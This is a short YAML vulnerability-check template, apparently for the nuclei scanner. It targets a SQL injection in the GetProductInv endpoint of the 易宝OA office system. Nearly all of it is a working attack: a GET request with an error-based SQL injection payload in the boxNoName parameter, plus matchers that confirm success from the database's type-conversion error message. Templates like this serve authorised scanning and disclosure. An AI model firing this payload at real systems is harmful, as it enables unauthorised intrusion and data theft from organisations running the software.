id: poc-yaml-yi-bao-oa-system-getproductinv-sqli
info:
  name: 易宝OA系统 GetProductInv SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    易宝OA系统 GetProductInv endpoint is vulnerable to SQL Injection that can be exploited by injecting a payload in the `boxNoName` parameter.
http:
  - method: GET
    path:
      - "{{BaseURL}}/SmartTradeScan/Inventory/GetProductInv?boxNoName=1%27%20AND%201411%20IN%20(SELECT%20(CHAR(113)%2bCHAR(98)%2bCHAR(112)%2bCHAR(112)%2bCHAR(113)%2b(SELECT%20(CASE%20WHEN%20(1411=1411)%20THEN%20CHAR(49)%20ELSE%20CHAR(48)%20END))%2bCHAR(113)%2bCHAR(120)%2bCHAR(122)%2bCHAR(122)%2bCHAR(113)))--%20YyAm&positionName=2&productID=3&opeID=4"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "在将 varchar 值"
          - "转换成数据类型 int 时失败"
          - "\"is_succeed\":false"
      - type: word
        part: header
        words:
          - "application/json"
